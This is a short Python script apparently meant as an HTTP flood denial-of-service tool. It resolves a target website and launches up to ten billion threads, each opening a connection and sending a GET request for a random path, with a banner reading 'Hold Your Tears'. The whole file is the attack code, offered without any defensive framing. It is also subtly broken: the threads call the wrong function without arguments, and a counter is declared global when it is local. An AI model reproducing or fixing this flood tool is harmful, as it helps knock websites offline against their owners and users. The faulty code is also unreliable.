import random
import socket
import string
import sys
import threading
import time


def attack(host: str, port: int = 80, request_count: int = 10 ** 10) -> None:
    # Threading support
    thread_num = 0
    thread_num_mutex = threading.Lock()

    # Utility function
    def print_status() -> None:
        global thread_num
        thread_num_mutex.acquire(True)

        thread_num += 1
        print("\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Hold Your Tears #-#-#")

        thread_num_mutex.release()

    def generate_url_path():
        msg = str(string.ascii_letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, 5))
        return data

    def attack_() -> None:
        print_status()
        url_path = generate_url_path()

        dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            dos.connect((ip, port))

            msg = f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n"
            dos.send(msg.encode())
        except socket.error:
            print(f"[ERROR] Site may be down | {socket.error}")
        finally:
            dos.shutdown(socket.SHUT_RDWR)
            dos.close()

    try:
        host = host.replace("https://", "").replace("http://", "").replace("www.", "")
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print("[ERROR] Make sure you entered a correct website!")
        sys.exit(2)

    all_threads = []

    for i in range(request_count):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)

        time.sleep(0.01)

    for current_thread in all_threads:
        current_thread.join()
